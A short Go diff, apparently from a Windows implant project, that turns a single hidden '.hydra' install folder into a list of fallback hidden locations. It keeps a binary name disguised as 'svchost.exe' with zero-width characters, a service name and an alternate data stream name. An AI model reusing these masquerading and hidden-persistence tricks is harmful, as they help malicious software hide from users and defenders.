@@ -8,11 +8,16 @@ const (
 	Interval    = 5
 
 	Ads     = "blueberry"
-	Base    = "$userprofile\\Saved Games\\.hydra"
 	Binary  = "s\u200bvch\u200bost.exe"
 	Service = "Memserv2"
 )
 
 var (
 	StartTime = time.Now()
+	Base      = [...]string{
+		"C:\\.hydra",
+		"$userprofile\\Saved Games\\.hydra",
+		"$userprofile\\Documents\\.hydra",
+		"$temp\\.hydra",
+	}
 )
